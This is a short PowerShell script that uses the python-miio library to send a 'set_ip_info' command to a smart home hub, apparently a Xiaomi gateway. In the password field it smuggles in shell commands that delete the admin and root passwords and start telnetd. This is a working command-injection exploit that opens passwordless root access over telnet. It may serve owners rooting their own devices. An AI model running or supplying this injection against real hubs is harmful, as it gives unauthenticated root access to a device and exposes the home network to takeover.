[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)][string]$HubIp,
    [string]$Python='C:\Windows\py.exe'
)
$ErrorActionPreference='Stop'
$token = Read-Host 'MiIO token (32 hex)'
if ($token -notmatch '^[0-9A-Fa-f]{32}$') { throw 'Token invalid' }
$env:HUB_IP=$HubIp
$env:MIIO_TOKEN=$token
try {
    & $Python -3 -c "from miio import Device; import os; q=chr(34); d=Device(os.environ['HUB_IP'],os.environ['MIIO_TOKEN']); print(d.raw_command('set_ip_info',{'ssid':q+q,'pswd':'123123 ; passwd -d admin ; passwd -d root ; telnetd'}))"
    if ($LASTEXITCODE -ne 0) { throw "MiIO/Telnet failed: $LASTEXITCODE" }
    Write-Host "TELNET_REQUEST_SENT $HubIp"
}
finally {
    Remove-Item Env:HUB_IP -ErrorAction SilentlyContinue
    Remove-Item Env:MIIO_TOKEN -ErrorAction SilentlyContinue
}
